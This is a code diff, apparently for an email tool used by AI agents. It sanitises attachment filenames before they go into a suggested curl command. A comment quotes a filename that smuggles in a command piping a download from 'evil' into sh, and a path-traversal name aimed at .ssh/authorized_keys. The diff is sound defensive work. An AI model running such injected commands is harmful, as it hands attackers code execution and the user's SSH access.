@@ -24,6 +24,20 @@ import { errorResult, type ToolResult, textResult } from './result.ts'
 // call always resolves text bodies, so cap them to almost nothing.
 const METADATA_BODY_VALUE_BYTES = 16
 
+// Characters that could break out of the single-quoted curl example or
+// steer the write path: quotes, backslashes, path separators, controls.
+const SHELL_UNSAFE_RE = /[\p{Cc}'"\\/]/gu
+const LEADING_DOTS_RE = /^\.+/u
+
+// The curl example is text an agent may run verbatim, and the filename comes
+// from the incoming email — i.e. from an arbitrary sender. A name like
+// `x'; curl evil | sh; '` or `../../.ssh/authorized_keys` must not survive
+// into the suggested command.
+const shellSafeFilename = (name: string): string => {
+  const cleaned = name.replaceAll(SHELL_UNSAFE_RE, '_').replace(LEADING_DOTS_RE, '').trim()
+  return cleaned || 'attachment'
+}
+
 const downloadAttachmentShape = {
   blobId: z.string().min(1).describe('The attachment blobId, as listed by get_email for that message.'),
   emailId: z.string().min(1).describe('The id of the message the attachment belongs to.'),
@@ -79,7 +93,7 @@ export const downloadAttachment = async (
       `Download URL (expires in ${TICKET_TTL_MINUTES} minutes):\n` +
       `${url}\n\n` +
       'Save it straight to a file, e.g.:\n' +
-      `  curl -sS -o '${name}' '${url}'\n` +
+      `  curl -sS -o '${shellSafeFilename(name)}' '${url}'\n` +
       'Do not fetch this URL into the conversation — the file may be large.'
   )
 }
